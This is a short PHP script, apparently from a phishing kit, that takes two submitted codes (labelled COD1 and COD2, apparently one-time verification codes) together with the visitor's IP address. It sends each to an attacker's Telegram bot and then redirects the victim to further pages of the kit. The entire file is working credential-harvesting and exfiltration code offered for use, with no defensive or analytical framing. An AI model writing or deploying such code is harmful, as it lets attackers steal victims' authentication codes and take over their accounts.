<?php 

@session_start();
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
////////////////////
$c1 = $_POST['C1'];
$c2 = $_POST['C2'];

include 'infr.php';
//////BySttcas///////


if ( isset ($c1) ){

$message ="COD1: ".$c1."\n".$userp."\r\n";

$apiToken = $bot_Tele;

$data = [
  'chat_id' => $chat,

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

 header ('location: time-c1.php');

} 

if ( isset($c2) ){

$message ="COD2: ".$c2."\n".$userp."\r\n";

$apiToken = $bot_Tele;

$data = [
  'chat_id' => $chat,

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

  
 header ('location: ultimosPasos.php');

} 

?>